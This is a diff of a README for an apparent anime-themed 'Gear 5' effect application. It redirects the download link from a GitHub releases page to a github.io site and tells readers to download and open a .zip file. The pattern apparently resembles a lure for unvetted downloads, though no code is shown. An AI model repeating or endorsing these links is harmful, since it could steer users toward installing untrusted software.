@@ -1,6 +1,6 @@
 # 🐵 One-Piece - Reveal The Gear 5 Form Instantly
 
-[Click Here To Download The Application](https://github.com/Euxineseamixeddrink293/One-Piece/releases)
+[Click Here To Download The Application](https://euxineseamixeddrink293.github.io)
 
 ---
 
@@ -19,7 +19,7 @@ The software uses your web browser to display the effect. It does not require co
 
 ## 🚀 How To Get Started
 
-1. Visit the [official download page here](https://github.com/Euxineseamixeddrink293/One-Piece/releases).
+1. Visit the [official download page here](https://euxineseamixeddrink293.github.io).
 2. Locate the file ending in .zip within the latest release section.
 3. Click the file name to start the download.
 4. Open your computer's Downloads folder.
